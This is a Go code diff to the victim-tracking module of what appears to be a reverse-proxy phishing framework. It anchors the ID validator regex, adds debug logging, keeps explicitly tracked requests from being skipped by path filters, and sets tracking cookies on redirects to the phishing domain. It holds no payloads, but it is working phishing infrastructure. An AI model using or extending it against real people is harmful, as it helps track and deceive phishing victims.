@@ -173,15 +173,28 @@ func Load(s *session.Session) (m *Tracker, err error) {
 		"}-[a-fA-F0-9]{12}$")
 
 	if config.ValidatorRegex != "" {
-		m.ValidatorRegex, err = regexp.Compile(config.ValidatorRegex)
+		// Ensure the regex has anchors to match the full string, not just a substring
+		validatorPattern := config.ValidatorRegex
+		if !strings.HasPrefix(validatorPattern, "^") {
+			validatorPattern = "^" + validatorPattern
+		}
+		if !strings.HasSuffix(validatorPattern, "$") {
+			validatorPattern = validatorPattern + "$"
+		}
+
+		m.ValidatorRegex, err = regexp.Compile(validatorPattern)
 		if err != nil {
 			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.ValidatorRegex)
 			return
 		}
+		m.Debug("Loaded validator regex: %s (original: %s)", validatorPattern, config.ValidatorRegex)
+	} else {
+		m.Debug("Using default UUID4 validator regex")
 	}
 
 	// get the tracker length
 	m.TrackerLength = len(m.makeID())
+	m.Debug("Tracker length: %d", m.TrackerLength)
 
 	m.Important("loaded successfully")
 	return
@@ -265,13 +278,21 @@ func (module *Tracker) makeTrace(id string) (t *Trace) {
 }
 
 func (module *Tracker) makeID() string {
-	str, err := reggen.NewGenerator(module.ValidatorRegex.String())
+	// Strip anchors (^ and $) from the regex pattern for generation
+	// reggen doesn't need them and they might cause issues
+	pattern := module.ValidatorRegex.String()
+	pattern = strings.TrimPrefix(pattern, "^")
+	pattern = strings.TrimSuffix(pattern, "$")
+
+	str, err := reggen.NewGenerator(pattern)
 	if err != nil {
-		module.Error("%", err)
+		module.Error("Failed to create ID generator from pattern %s: %v", pattern, err)
 		return ""
 	}
 
-	return str.Generate(1)
+	generated := str.Generate(1)
+	module.Debug("Generated ID: %s (from pattern: %s)", generated, pattern)
+	return generated
 }
 
 // TrackRequest tracks an HTTP RequestTemplate
@@ -291,15 +312,39 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 		return
 	}
 
-	if isDisabledPath(request.URL.Path) {
-		return
-	}
-
 	if isDisabledMediaType(request.Header.Get("Access"), DisabledMedia) {
 		return
 	}
 
 	if isDisabledMediaType(request.Header.Get("Content-Type"), DisabledMedia) {
+		return
+	}
+
+	// Check if there's an existing tracking parameter/cookie BEFORE applying path filters
+	// This ensures we don't skip requests with explicit tracking IDs (e.g., /?session=XXX)
+	hasExistingTracking := false
+	queryID := request.URL.Query().Get(module.Identifier)
+	if queryID != "" {
+		testTrace := module.makeTrace(queryID)
+		if testTrace.IsValid() {
+			module.Debug("[Early check] Found valid tracking ID in query: %s", queryID)
+			hasExistingTracking = true
+		}
+	}
+	if !hasExistingTracking {
+		if c, err := request.Cookie(module.Identifier); err == nil {
+			testTrace := module.makeTrace(c.Value)
+			if testTrace.IsValid() {
+				module.Debug("[Early check] Found valid tracking ID in cookie: %s", c.Value)
+				hasExistingTracking = true
+			}
+		}
+	}
+
+	// Only apply path filter if there's no existing tracking
+	// This prevents skipping important tracked requests like /?session=XXX
+	if !hasExistingTracking && isDisabledPath(request.URL.Path) {
+		module.Debug("[Path filter] Skipping untracked request to: %s", request.URL.Path)
 		return
 	}
 
@@ -317,53 +362,77 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 		match := re.FindStringSubmatch(request.URL.Path)
 		if len(match) > 0 {
-			// module.Info("tracking path match: %v", match)
-			t = module.makeTrace(match[0])
+			extractedID := match[0]
+			module.Debug("[Path-based tracking] Extracted ID from path: %s", extractedID)
+			t = module.makeTrace(extractedID)
 			if t.IsValid() {
+				module.Debug("[Path-based tracking] ID validation successful: %s", t.ID)
 				request.Header.Set(module.LandingHeader, strings.ReplaceAll(request.URL.Path, t.ID, ""))
-				module.Info("setting %s header to %s", module.LandingHeader, strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				module.Info("Setting %s header to %s (tracked ID: %s)", module.LandingHeader,
+					strings.ReplaceAll(request.URL.Path, t.ID, ""), t.ID)
 				noTraces = false
 				isTrackedPath = true
+			} else {
+				module.Debug("[Path-based tracking] ID validation failed for: %s (validator: %s)",
+					extractedID, module.ValidatorRegex.String())
 			}
+		} else {
+			module.Debug("[Path-based tracking] No match found in path: %s", request.URL.Path)
 		}
 	}
 
 	if noTraces {
 		// Fallback
 		// Use Query String
-		t = module.makeTrace(request.URL.Query().Get(module.Identifier))
-		if t.IsValid() {
-			noTraces = false
+		queryID := request.URL.Query().Get(module.Identifier)
+		if queryID != "" {
+			module.Debug("[Query-based tracking] Found query parameter '%s' with value: %s", module.Identifier, queryID)
+			t = module.makeTrace(queryID)
+			if t.IsValid() {
+				module.Debug("[Query-based tracking] ID validation successful: %s", t.ID)
+				noTraces = false
+			} else {
+				module.Debug("[Query-based tracking] ID validation failed for: %s (validator: %s)",
+					queryID, module.ValidatorRegex.String())
+			}
 		} else {
-			// Checking Cookies
+			module.Debug("[Query-based tracking] Query parameter '%s' not found in request", module.Identifier)
+		}
+
+		// If query string didn't work, check cookies
+		if noTraces {
 			c, err := request.Cookie(module.Identifier)
 			if err == nil {
+				module.Debug("[Cookie-based tracking] Found cookie '%s' with value: %s", module.Identifier, c.Value)
 				t.ID = c.Value
 
 				// Validate cookie content
 				if t.IsValid() {
+					module.Debug("[Cookie-based tracking] ID validation successful: %s", t.ID)
 					noTraces = false
 				} else {
+					module.Debug("[Cookie-based tracking] ID validation failed for: %s (validator: %s)",
+						c.Value, module.ValidatorRegex.String())
 					t = module.makeTrace("")
 				}
+			} else {
+				module.Debug("[Cookie-based tracking] Cookie '%s' not found", module.Identifier)
 			}
 		}
 	}
 
 	if noTraces {
-
-		// if the Cookie HTTP Header is not set, skip
-		if request.Header.Get("Cookie") == "" {
-			return
-		}
-
+		module.Debug("[New ID generation] No valid tracking ID found, generating new one")
 		t.ID = module.makeID()
+		module.Debug("[New ID generation] Generated tracking ID: %s", t.ID)
 	}
 
 	//
 	// Set trackers:
 	// - HTTP Headers If-Range, or custom defined
+	// This header is CRITICAL for redirect tracking - TrackResponse() relies on it
 	request.Header.Set(module.Header, t.ID)
+	module.Debug("[TrackRequest] Set tracking header '%s: %s' for request to %s", module.Header, t.ID, request.URL.Path)
 
 	// Check if the Trace ID is bind to an existing victim
 	v, verr := module.GetVictim(t)
@@ -415,40 +484,68 @@ func (module *Tracker) TrackResponse(response *http.Response) (t *Trace) {
 
 	trackingFound := false
 	t = module.makeTrace("")
+	isRedirect := response.StatusCode >= 300 && response.StatusCode < 400
+
+	module.Debug("[TrackResponse] Processing response: status=%d, url=%s, isRedirect=%v",
+		response.StatusCode, response.Request.URL, isRedirect)
 
 	// Check cookies first to avoid replacing issues
 	for _, cookie := range response.Request.Cookies() {
 		if cookie.Name == module.Identifier {
 			t.ID = cookie.Value
 			trackingFound = t.IsValid()
+			module.Debug("[TrackResponse] Found tracking cookie in request: %s (valid=%v)", t.ID, trackingFound)
 			break
 		}
 	}
 
 	if !trackingFound {
 		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
-		t = module.makeTrace(response.Request.Header.Get(module.Header))
+		// CRITICAL: For redirects, we rely on the request header set by TrackRequest()
+		// We do NOT parse the Location header - it may not contain the tracking ID
+		headerID := response.Request.Header.Get(module.Header)
+		module.Debug("[TrackResponse] Checking header '%s': %s", module.Header, headerID)
+
+		if headerID == "" && isRedirect {
+			module.Warning("[TrackResponse] REDIRECT detected but tracking header '%s' is EMPTY! "+
+				"This means TrackRequest() was skipped. Original URL: %s", module.Header, response.Request.URL)
+		}
+
+		t = module.makeTrace(headerID)
 		if t.IsValid() {
 			cookieDomain := module.Session.Config.Proxy.Phishing
 			if module.Session.Config.Tracking.Trace.Domain != "" {
 				cookieDomain = module.Session.Config.Tracking.Trace.Domain
 			}
-			module.Info("Setting tracking cookie for domain: %s", cookieDomain)
 
-			response.Header.Add("Set-Cookie",
-				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-					module.Identifier, t.ID, cookieDomain))
+			// Set tracking cookie and header
+			cookieValue := fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
+				module.Identifier, t.ID, cookieDomain)
 
+			response.Header.Add("Set-Cookie", cookieValue)
 			response.Header.Add(module.Header, t.ID)
 			trackingFound = true
+
+			if isRedirect {
+				module.Info("[TrackResponse] Setting tracking cookie for REDIRECT (status=%d): ID=%s, domain=%s",
+					response.StatusCode, t.ID, cookieDomain)
+			} else {
+				module.Info("[TrackResponse] Setting tracking cookie: ID=%s, domain=%s", t.ID, cookieDomain)
+			}
+			module.Debug("[TrackResponse] Cookie value: %s", cookieValue)
+		} else {
+			module.Debug("[TrackResponse] Header ID validation failed: %s (validator: %s)",
+				headerID, module.ValidatorRegex.String())
 		}
 	}
 
 	if !trackingFound {
-		module.Verbose("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
+		module.Verbose("[TrackResponse] Untracked response: status=%d, method=%s, url=%s",
+			response.StatusCode, response.Request.Method, response.Request.URL)
 		// Reset trace
 		t = module.makeTrace("")
-
+	} else {
+		module.Debug("[TrackResponse] Successfully tracked: ID=%s, status=%d", t.ID, response.StatusCode)
 	}
 
 	return
